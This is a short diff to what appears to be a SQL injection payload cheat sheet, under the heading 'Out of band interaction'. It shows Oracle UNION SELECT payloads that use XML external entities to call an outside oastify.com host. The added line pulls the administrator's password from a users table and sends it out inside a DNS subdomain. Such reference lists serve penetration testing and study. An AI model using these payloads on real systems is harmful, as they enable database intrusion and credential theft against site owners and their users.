@@ -364,4 +364,5 @@ and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
 ### Out of band interaction
 ```sql
 ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://s4xxbrj7yq5ncirvu0461nop2g87w7kw.oastify.com/"> %remote;]>'),'/l') FROM dual--
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.otlt0n83nmuj1egrjwt2qjdlrcx3lufi4.oastify.com/"> %remote;]>'),'/l') FROM dual-- >> For retrieve data
 ```
